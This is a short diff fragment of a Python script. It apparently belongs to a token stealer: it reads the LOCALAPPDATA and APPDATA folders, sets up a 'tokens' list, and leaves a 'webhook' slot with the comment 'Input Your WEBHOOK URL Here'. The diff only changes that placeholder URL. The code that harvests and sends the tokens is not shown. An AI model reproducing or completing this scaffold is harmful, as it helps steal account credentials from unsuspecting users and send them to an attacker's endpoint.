@@ -2,7 +2,7 @@ import os
 import re
 import requests
 import json
-webhook = "https://youtube.com"  # Input Your WEBHOOK URL Here
+webhook = ""  # Input Your WEBHOOK URL Here
 local = os.getenv("LOCALAPPDATA")
 roaming = os.getenv("APPDATA")
 tokens = []
